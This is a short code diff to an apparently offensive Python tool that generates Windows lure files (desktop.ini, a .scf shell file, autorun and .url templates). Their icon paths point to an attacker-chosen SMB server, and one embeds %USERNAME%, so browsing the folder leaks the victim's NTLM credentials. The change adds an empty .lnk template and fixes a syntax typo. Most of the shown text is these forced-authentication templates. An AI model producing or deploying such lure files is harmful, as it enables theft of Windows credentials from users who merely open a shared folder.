@@ -11,6 +11,9 @@ action=open Setup.exe"""
     ini_file = f"""[.ShellClassInfo]
 IconResource=\\{target_server}\aa"""
 
+    lnk_file = f"""
+    """
+
     scf_file = f"""[Shell]
 Command=2
 IconFile=\\{target_server}\tools\nc.ico
@@ -23,7 +26,7 @@ WorkingDirectory=setup
 IconFile=\\{target_server}\%USERNAME%.icon
 IconIndex=1"""
 
-    Array_Modes, Array_Temp = [autorun_file, ini_file, scf_file, url_file]. []
+    Array_Modes, Array_Temp = [autorun_file, ini_file, scf_file, url_file], []
 
     if (mode == 'all'):
         for _ in range (0, len(Array_Modes)):
